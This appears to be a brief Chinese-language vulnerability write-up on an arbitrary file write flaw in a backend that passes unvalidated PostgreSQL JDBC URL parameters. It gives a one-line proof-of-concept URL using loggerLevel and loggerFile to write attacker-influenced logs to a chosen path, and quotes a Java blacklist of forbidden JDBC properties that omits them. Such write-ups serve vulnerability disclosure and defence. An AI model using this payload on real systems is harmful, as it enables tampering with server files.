# pgsql jdbc任意文件写入

后端没有验证loggerLevel和loggerFile参数，导致可以向任意目录写入日志，日志中包含我们自定义的字符串，导致存在有污染的任意文件写入漏洞

poc

```
jdbc:postgresql://127.0.0.1:5432/test/?loggerLevel=DEBUG&loggerFile=/tmp/test&aaaaaa
```

可以看到黑名单中并没有loggerLevel和loggerFile参数

```java
public static final String[] notAllowedProps = new String[]{"authenticationPluginClassName", "sslhostnameverifier", "socketFactory", "sslfactory", "sslpasswordcallback"};
```

